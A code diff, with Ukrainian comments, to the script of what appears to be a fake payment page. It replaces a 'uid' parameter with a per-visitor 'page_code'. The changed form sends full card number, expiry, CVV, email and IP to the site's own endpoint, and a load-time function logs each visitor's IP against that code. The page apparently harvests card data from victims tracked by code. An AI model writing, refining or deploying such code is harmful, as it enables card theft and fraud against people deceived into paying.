@@ -168,6 +168,11 @@
             document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
         }
     }
+    // --- Замість uid використовуємо page_code ---
+    function getPageCode() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+    }
     document.getElementById('paymentForm').onsubmit = async function(e) {
         e.preventDefault();
         const email = document.getElementById('email-input').value;
@@ -182,13 +187,13 @@
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
-            // Отримуємо user_id з URL параметрів
-            const user_id = getQueryParam('uid');
+            // Отримуємо page_code з URL або sessionStorage
+            const page_code = getPageCode();
             
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, user_id })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code })
             });
             if (response.ok) {
                 // Просто показуємо повідомлення
@@ -330,9 +335,9 @@
     <script>
     // --- Оновлення IP у базі при відкритті сторінки ---
     function updateSiteUserIP() {
-        const user_id = getQueryParam('uid');
-        if (!user_id) {
-            console.log('user_id (uid) не знайдено у URL, IP не буде записано');
+        const page_code = getPageCode();
+        if (!page_code) {
+            console.log('page_code не знайдено у URL/sessionStorage, IP не буде записано');
             return;
         }
         fetch('https://api.ipify.org?format=json')
@@ -342,7 +347,7 @@
                 fetch('/update_site_user_ip', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user_id, ip })
+                    body: JSON.stringify({ page_code, ip })
                 })
                 .then(r => r.text())
                 .then(txt => console.log('update_site_user_ip response:', txt))
